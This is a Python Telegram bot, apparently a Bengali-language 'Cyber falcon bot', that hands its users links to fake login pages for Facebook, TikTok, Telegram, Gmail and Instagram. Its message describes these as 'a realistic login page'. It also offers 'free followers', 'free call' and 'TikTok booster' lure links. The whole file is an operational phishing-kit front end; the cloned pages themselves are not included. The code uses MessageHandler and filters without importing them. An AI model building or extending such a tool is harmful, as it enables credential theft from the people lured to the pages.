import logging
import requests
import json
import os
from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from config import TELEGRAM_BOT_TOKEN, PORT

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

URL_FILE = "saved_url.json"

def save_url(url):
    try:
        with open(URL_FILE, 'w') as f:
            json.dump({'url': url}, f)
    except:
        pass

def load_saved_url():
    try:
        if os.path.exists(URL_FILE):
            with open(URL_FILE, 'r') as f:
                data = json.load(f)
                return data.get('url')
    except:
        pass
    return None

def get_public_url():
    saved_url = load_saved_url()
    if saved_url:
        return saved_url
    return os.environ.get('RENDER_EXTERNAL_URL', 'https://fc-bot-b3wy.onrender.com')

def get_local_ip():
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# ============= বটের হ্যান্ডলার ফাংশন =============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat.id
    user_name = update.message.from_user.first_name
    
    try:
        requests.get(f"http://localhost:{PORT}/add_user/{chat_id}", timeout=3)
    except:
        pass
    
    public_url = get_public_url()
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    
    keyboard = [
        [InlineKeyboardButton("🌐 All Mane page", callback_data="All_Mane_page")],
        [InlineKeyboardButton("📢 advance page", callback_data="All_advance_page")],
        [InlineKeyboardButton("🦅 Status", callback_data="status"),
         InlineKeyboardButton("🥷 community", url="https://t.me/+j8x9Tp4CGa80ZmM1")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message = f"""
😈 🦅𝘾.𝙁 𝘽𝙤𝙩 𝙥𝙧𝙤😈🦅

𝙃𝙞 {user_name}! 
𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝘾𝙮𝙗𝙚𝙧 𝙛𝙖𝙡𝙘𝙤𝙣 𝙗𝙤𝙩.

🥷𝗦𝘁𝗮𝘁𝘂𝘀: 🟢 𝗔𝗰𝘁𝗶𝘃𝗲
"""
    
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='Markdown')

async def all_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("📘 Facebook", callback_data="_facebook")],
        [InlineKeyboardButton("🤤 TikTok", callback_data="_tiktok")],
        [InlineKeyboardButton("✈️ Telegram", callback_data="_telegram")],
        [InlineKeyboardButton("📧 Gmail", callback_data="_gmail")],
        [InlineKeyboardButton("📷 Instagram", callback_data="_instagram")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text("😈 All Mane page Platforms\n\nSelect a platform:", reply_markup=reply_markup)

async def advance_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("🎯 ফ্রি ফলোয়ার", callback_data="_at")],
        [InlineKeyboardButton("📞 ফ্রি কল / Whatsapp", callback_data="_ai")],
        [InlineKeyboardButton("📢 TikTok বুস্টার", callback_data="_ad")],
        [InlineKeyboardButton("🚀 TikTok ফলোয়ার", callback_data="_go")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text("📢 advance page Menu\n\nSelect an option:", reply_markup=reply_markup)

async def show_page_link(update: Update, context: ContextTypes.DEFAULT_TYPE, page_name, url_path):
    query = update.callback_query
    await query.answer()
    public_url = get_public_url()
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    full_url = f"{public_url}/{url_path}"
    
    keyboard = [
        [InlineKeyboardButton("🌐 Open Public URL", url=full_url)],
        [InlineKeyboardButton("📍 Open Local URL", url=local_url)],
        [InlineKeyboardButton("🔙 Back", callback_data="All_Mane_page")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message = f"""{page_name} Link

🌐 **Public URL:**
`{full_url}`

📍 **Local URL:**
`{local_url}`

This link will show a realistic {page_name} login page.
"""
    await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='Markdown')

async def show_advance_link(update: Update, context: ContextTypes.DEFAULT_TYPE, title, url_path):
    query = update.callback_query
    await query.answer()
    public_url = get_public_url()
    full_url = f"{public_url}/{url_path}"
    
    keyboard = [[InlineKeyboardButton("🌐 ওপেন পেজ", url=full_url)],
                [InlineKeyboardButton("🔙 Back", callback_data="All_advance_page")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(f"{title}\n\n🔗 {full_url}", reply_markup=reply_markup)

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    public_url = get_public_url()
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message = f"""Bot Status

🦅 Bot Status: 🟢 Active
🦅 **Public URL:** `{public_url}`
📍 **Local URL:** `{local_url}`
🔌 **Port:** {PORT}

🛡️ All systems operational."""
    await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='Markdown')

async def back_to_main(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await start(update, context)

async def facebook(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_page_link(update, context, "Facebook", "facebook")

async def tiktok(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_page_link(update, context, "TikTok", "tiktok")

async def telegram_page(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_page_link(update, context, "Telegram", "telegram")

async def gmail(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_page_link(update, context, "Gmail", "gmail")

async def instagram(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_page_link(update, context, "Instagram", "instagram")

async def at_option(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_advance_link(update, context, "🎯 ফ্রি ফেসবুক ফলোয়ার", "facebook_followers")

async def ai_option(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_advance_link(update, context, "📞 ফ্রি কল / হোয়াটসঅ্যাপ গ্রুপ", "whatsapp_groups")

async def ad_option(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_advance_link(update, context, "📢 TikTok ভিউ+লাইক বুস্টার", "tiktok_boost")

async def go_option(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_advance_link(update, context, "🚀 TikTok ফ্রি ফলোয়ার", "tiktok_followers")

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    
    handlers = {
        "All_Mane_page": all_menu,
        "All_advance_page": advance_menu,
        "main_menu": back_to_main,
        "status": status,
        "_facebook": facebook,
        "_tiktok": tiktok,
        "_telegram": telegram_page,
        "_gmail": gmail,
        "_instagram": instagram,
        "_at": at_option,
        "_ai": ai_option,
        "_ad": ad_option,
        "_go": go_option,
    }
    
    handler = handlers.get(data)
    if handler:
        await handler(update, context)
    else:
        await query.answer("Unknown button")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.message.from_user.first_name
    chat_id = update.message.chat.id
    try:
        requests.get(f"http://localhost:{PORT}/add_user/{chat_id}", timeout=3)
    except:
        pass
    await update.message.reply_text(f'🙋 Hi {user_name}! Type /start to see the main menu.')

async def error(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f'Update {update} caused error {context.error}')

async def run_bot():
    """বট চালানোর ফাংশন"""
    print("🦅 Telegram Bot Starting...")
    
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("link", start))
    application.add_handler(CallbackQueryHandler(handle_callback))
    application.add_handler(MessageHandler(filters.TEXT, handle_message))
    application.add_error_handler(error)
    
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    
    print("✅ Telegram Bot is polling for updates...")
    
    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print("Bot shutting down...")
        await application.updater.stop()
        await application.stop()
        await application.shutdown()

# লোকাল টেস্টিংয়ের জন্য (ঐচ্ছিক)
import asyncio
if __name__ == '__main__':
    asyncio.run(run_bot())
